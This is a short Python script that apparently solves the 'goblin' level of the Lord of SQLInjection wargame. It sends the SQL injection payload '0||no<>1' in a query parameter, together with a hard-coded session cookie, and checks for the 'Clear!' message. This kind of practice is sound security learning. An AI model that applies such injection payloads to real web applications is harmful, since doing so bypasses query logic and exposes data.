import requests

url = "http://los.rubiya.kr/goblin_e5afb87a6716708e3af46a849517afdc.php"
session = {'PHPSESSID':'93ve0c2qguabtgrggiimgde352'}
data = {'no':"0||no<>1"}

res = requests.get(url, params=data, cookies = session)

if "Clear!" in res.text:
   print("[♪] GOBLIN Clear!")
